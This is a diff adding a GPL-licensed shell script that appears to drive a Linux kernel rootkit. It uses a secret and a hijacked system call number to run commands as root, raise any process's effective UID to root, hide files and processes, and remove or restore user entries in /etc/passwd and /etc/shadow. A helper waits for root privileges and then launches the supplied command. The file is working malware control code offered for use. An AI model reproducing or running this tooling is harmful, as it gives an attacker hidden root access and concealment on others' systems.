@@ -1,0 +1,57 @@
+#!/usr/bin/env sh
+# Copyright 2019 Bailey Defino
+# <https://bdefino.github.io>
+
+# This program is free software: you can redistribute it and/or modify
+# it under the terms of the GNU General Public License as published by
+# the Free Software Foundation, either version 3 of the License, or
+# (at your option) any later version.
+
+# This program is distributed in the hope that it will be useful,
+# but WITHOUT ANY WARRANTY; without even the implied warranty of
+# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+# GNU General Public License for more details.
+
+# You should have received a copy of the GNU General Public License
+# along with this program.  If not, see <https://www.gnu.org/licenses/>.
+
+# simple driver script
+# Usage: ./$0 CALL SECRET [COMMAND [ULONG | 0xHEXULONG | @CARRAY ...]]
+# CALL
+#   system call number
+# COMMAND
+#   module command to execute
+#     command ARGS -> execute the arguments as root
+#     drop PID -> set a process's EUID to its UID
+#     elevate PID -> set a process's EUID to root
+#     ghost UID -> remove a user from "/etc/passwd" and "/etc/shadow"
+#     hide PATH -> hide an entity ("/proc" paths are treated as processes)
+#     show PATH -> show a hidden entity ("/proc" paths are treated as processes)
+#     unghost UID -> replace a user in "/etc/passwd" and "/etc/shadow"
+
+[ -z "$1" ] && echo "Expected a system call number." >&2 && exit 1
+CALL="$1"
+[ -z "$3" ] && echo "Expected a command." >&2 && exit 1
+COMMAND="$3"
+[ -z "$2" ] && echo "Expected a secret." >&2 && exit 1
+SECRET="$2"
+REST_LEN=`echo -n "${CALL} ${SECRET} ${COMMAND}" | wc -c`
+REST=`echo -n "$@" | cut "-c$(( ${REST_LEN} + 1 ))-"`
+
+need_root() {
+  while [ `id -u` != 0 ]
+  do
+    sleep 0.1
+  done
+  [ ! -z "$@" ] && $@ &
+}
+
+if [ "${COMMAND}" = command ]
+then
+  # this is a pseudo-command
+  
+  need_root ${REST} &
+  REST=$!
+fi
+./syscall "${CALL}" "${SECRET}" "@${COMMAND}" ${REST}
+
